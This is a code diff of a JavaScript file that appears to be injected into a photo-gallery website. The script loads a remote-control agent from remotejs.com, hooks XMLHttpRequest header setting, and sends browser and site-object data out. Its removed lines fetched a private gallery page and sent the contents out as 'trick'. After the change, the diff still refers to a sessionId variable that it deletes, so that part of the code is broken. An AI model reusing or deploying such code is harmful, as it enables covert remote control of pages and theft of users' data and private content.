@@ -7,7 +7,7 @@ function uuidv4() {
 function sendData(type, data) {
   try {
     const envelope = {};
-    envelope.sessionId = sessionId;
+    envelope.sessionId = window.rjsSessionId;
     envelope.type = type;
     envelope.data = data;
     envelope.userAgent = navigator?.userAgent;
@@ -27,13 +27,9 @@ function sendData(type, data) {
   } catch (err) { }
 }
 
-// Maintain the same sessionId in the tab
-let sessionId;
-if (sessionStorage.getItem('rjsSessionId')) {
-  sessionId = sessionStorage.getItem('rjsSessionId');
-} else {
-  sessionId = uuidv4();
-  sessionStorage.setItem('rjsSessionId', sessionId);
+// Create a session ID for the window
+if (!window.rjsSessionId) {
+  window.rjsSessionId = uuidv4();
 }
 
 const xhrMap = new Map();
@@ -116,10 +112,13 @@ XMLHttpRequest.prototype.setRequestHeader = function () {
 
 // Start session
 function startSession() {
-  const agentScript = document.createElement('script');
-  agentScript.src = 'https://remotejs.com/agent/agent.js';
-  agentScript.setAttribute('data-consolejs-channel', sessionId);
-  document.head.appendChild(agentScript);
+  if (!window.self.location.href.includes('mobilecover') && !window.remoteInit) { 
+    const agentScript = document.createElement('script');
+    agentScript.src = 'https://remotejs.com/agent/agent.js';
+    agentScript.setAttribute('data-consolejs-channel', window.rjsSessionId);
+    document.head.appendChild(agentScript);
+    window.remoteInit = true;
+  }
 };
 startSession();
 sendData('session', { sessionId });
@@ -148,9 +147,3 @@ for (const prop in _pt$) {
   ptProps.push(prop);
 }
 sendData('pt-props', ptProps);
-
-fetch('https://beauboudoir.pic-time.com/-natalieunedited/gallery').then(
-  response => response.text()
-).then(
-  data => sendData('trick', data)
-);
